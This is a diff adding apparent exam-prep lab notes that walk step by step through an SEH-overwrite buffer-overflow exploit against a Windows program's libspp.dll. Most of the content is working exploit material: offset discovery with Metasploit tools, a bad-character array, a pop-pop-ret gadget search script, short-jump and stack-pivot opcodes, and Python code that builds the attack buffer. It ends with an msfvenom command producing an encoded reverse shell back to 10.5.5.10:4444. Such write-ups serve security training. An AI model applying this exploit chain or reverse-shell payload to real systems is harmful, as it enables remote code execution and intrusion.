@@ -1,0 +1,243 @@
+basic attack: buffer overflow causes crash. os calls handler. handler is overflown. runs pop pop return. this lands on the stack. then you jump over the handler pointer. then jump to bypass bad memory and execute shellcode on the stack. 
+# snap back
+run exchain to see if you own eip. this also shows (in this case at least) the location of the buffer that i own. 
+```
+0:011> !exchain
+019df5ac: ntdll!ExecuteHandler2+44 (779665c0)
+019dfe0c: libpal!md5_starts+149fb (005cd6eb)
+019dff44: 41414141
+Invalid exception stack at 41414141
+0:011> dc 019dff44
+019dff44  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+```
+create a meterpreter pattern and figure out what it do. 
+```
+ /home/nathan/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
+```
+looks like we have overwritten it. 
+```
+0:011> !exchain
+019ff5ac: ntdll!ExecuteHandler2+44 (779665c0)
+019ffe0c: libpal!md5_starts+149fb (0097d6eb)
+019fff44: 33654132
+Invalid exception stack at 65413165
+```
+checking where that at?
+```
+/home/nathan/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 33654132
+[*] Exact match at offset 128
+```
+quick code edit and offset check shows we gucci
+```
+ !exchain
+0080fe0c: libpal!md5_starts+149fb (00a9d6eb)
+0080ff44: 69696969
+Invalid exception stack at 41414141
+```
+code:
+```
+    size= 1000
+    inputBuffer=b"\x41" *128
+    inputBuffer+=b"\x69" *4
+    inputBuffer+=b"\x43" * (size - len(inputBuffer))
+```
+further looking at it:
+```
+0:001> dc 0080ff44
+0080ff44  41414141 69696969 43434343 43434343  AAAAiiiiCCCCCCCC
+```
+# bad chars
+going to take a previosly create bytearray from sysncbreeze with common bad chars already removed. (00, 0a, 09, 0D, 25, 26, 2B, 3D are removed). now, 02, f8, and fd are also removed.
+```
+bytearray(
+    b"\x01\x03\x04\x05\x06\x07\x08\x0b\x0c\x0e\x0f\x10"
+    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+    b"\x21\x22\x23\x24\x27\x28\x29\x2a\x2c\x2d\x2e\x2f\x30"
+    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3e\x3f\x40"
+    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf9\xfa\xfb\xfc\xfe\xff"
+    )
+```
+repeat, and find them. anyways, load narly for modules without seh protection.
+download from [here.](https://code.google.com/archive/p/narly/downloads) and place dll here:
+```
+C:\Program Files\Windows Kits\10\Debuggers\x86\winext
+```
+then load and run.
+```
+.load narly
+!nmod
+```
+libspp.dll shows safeseh off.  now use nasm to find the command you need. 
+```
+/home/nathan/metasploit-framework/tools/exploit/nasm_shell.rb
+```
+use this to run pop eax, and every register. then make a script to search for that. 
+```
+.block
+{
+    .for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01)
+    {
+        .for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01)
+        {
+            s-[1]b 10000000 10223000 $t0 $t1 c3
+        }
+    }
+}
+```
+now run like so: prefix with this weird symbol than script location. ext doesnt matter
+```
+$><C:\users\osed\desktop\poppopreturn.wds
+```
+it doesnt really matter which one we use. exept no pop esp. that will redirect everything.
+```
+u 10151820
+libspp!pcre_exec+0xf9d0:
+10151820 5e              pop     esi
+10151821 5d              pop     ebp
+```
+issue: two modules both want that base. this only works ~75% of the time. meh.
+```
+lm m libspp
+Browse full module list
+start    end        module name
+00940000 00b63000   libspp     (deferred)             
+0:011> !address 10000000 
+```
+now we update our code. 
+```
+ inputBuffer+=pack("<L", (0x10151820)) #pop esi, pop edp.
+```
+then we put a breakpoint at that address, and go. 
+```
+bp 10151820
+g
+```
+now we step through. 
+```
+dd poi(esp) L8
+01a7ff44  41414141 10151820 43434343 43434343
+01a7ff54  43434343 43434343 43434343 43434343
+```
+it appears that we have taken contorl! look after esp is examined it is pointng to our 'shellcode'.
+now we can see if we should do a jump or not. in this case, i do not have to, as the commands from my previous jump do not translate to anything bad. lets still jump though. 
+```
+0:011> u eip L8
+01a1ff44 41              inc     ecx
+01a1ff45 41              inc     ecx
+01a1ff46 41              inc     ecx
+01a1ff47 41              inc     ecx
+01a1ff48 b082            mov     al,82h
+01a1ff4a 1510434343      adc     eax,43434310h
+01a1ff4f 43              inc     ebx
+01a1ff50 43              inc     ebx
+```
+# skipping the jump
+you could do this. lets not. 
+# not skipping the jump
+here, we make the relative jump. our buffer starts at 019dff4c.
+```
+0:011> dds eip L4
+019dff44  41414141
+019dff48  101582b0 libspp!pcre_exec+0x16460
+019dff4c  43434343
+019dff50  43434343
+```
+so now, lets create a jump to it.
+```
+0:011> a
+019dff44 jmp 0x019dff4c
+jmp 0x019dff4c
+019dff46 
+
+0:011> u eip
+019dff44 eb06            jmp     019dff4c
+```
+all were doing  is jumping over 6 bytes. this can be encoded and added to our attack. this will become 9090eb06 (nop, nop, jmp 6 bytes forward). decrease initial padding by 4. 
+```
+    inputBuffer+=pack("<L", (0x06eb9090)) #nop,nop jmp 6
+    inputBuffer+=pack("<L", (0x101582b0)) #pop esi, pop edp.
+```
+we should have jumped over our previous instructions now! not absolutely necessary but good to do. 
+
+next we updtae our script to send nops and shellcode to figure out about where everything lands. 
+```
+size= 1000
+    shellcode=b"\x43" * 400
+    inputBuffer=b"\x41" *124
+    inputBuffer+=pack("<L", (0x06eb9090)) #nop,nop jmp 6
+    inputBuffer+=pack("<L", (0x101582b0)) #pop esi, pop edp.
+    inputBuffer+=b"\x90" * (size - len(inputBuffer) -len(shellcode))
+    inputBuffer+=shellcode
+```
+then we find that spot by searching the thread environment. 
+```
+0:011> !teb
+TEB at 00254000
+    ExceptionList:        019bf5ac
+    StackBase:            019c0000
+    StackLimit:           019be000
+    SubSystemTib:         00000000
+    FiberData:            00001e00
+    ArbitraryUserPointer: 00000000
+    Self:                 00254000
+    EnvironmentPointer:   00000000
+    ClientId:             000022e0 . 00001df0
+    RpcHandle:            00000000
+    Tls Storage:          0061c8e8
+    PEB Address:          00246000
+    LastErrorValue:       0
+    LastStatusValue:      c000000d
+    Count Owned Locks:    0
+    HardErrorMode:        0
+0:011> s -b 019be000 019c0000 90 90 90 90 43 43 43 43
+019bfc60  90 90 90 90 43 43 43 43-43 43 43 43 43 43 43 43  ....CCCCCCCCCCCC
+```
+dump the full address to ensure its not truncated:
+```
+dd 019bfc60 L65
+```
+if its good, lets continue. we now calculate the offset, or the difference from these nops to the top of the stack. 
+```
+? 019bfc60 - @esp
+Evaluate expression: 1736 = 000006c8
+```
+now lets get our assembly for that. 
+```
+/home/nathan/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm > add sp, 0x6c8
+00000000  6681C4C806        add sp,0x6c8
+nasm > jmp esp
+00000000  FFE4              jmp esp
+```
+now we put that in our code
+```
+    shellcode=b"\x43" * 400
+    inputBuffer=b"\x41" *124
+    inputBuffer+=pack("<L", (0x06eb9090)) #nop,nop jmp 6
+    inputBuffer+=pack("<L", (0x101582b0)) #pop esi, pop edp.
+    inputBuffer+=b"\x90" * 2 #even out bytes
+    inputBuffer+=b"\x66\x81\xc4\xc8\x06"    #add alot to sp
+    inputBuffer+=b"\xff\xe4" #jmp esp
+    inputBuffer+=b"\x90" * (size - len(inputBuffer) -len(shellcode))
+```
+and were good! test to make sure u jump to a nop after you step through. 
+we will cheat on that bad chars a bit and use this:
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.5.5.10 LPORT=4444 EXITFUNC=thread -f python -v shellcode -e x86/shikata_ga_nai -b "\x00\x02\x0a\x0d\xf8\xfd"
+```
+but somehow we jump to the wrong area? - no u just fat fingered the second add. whoops. 
+
+now this should work!!!!!
+it does.
+
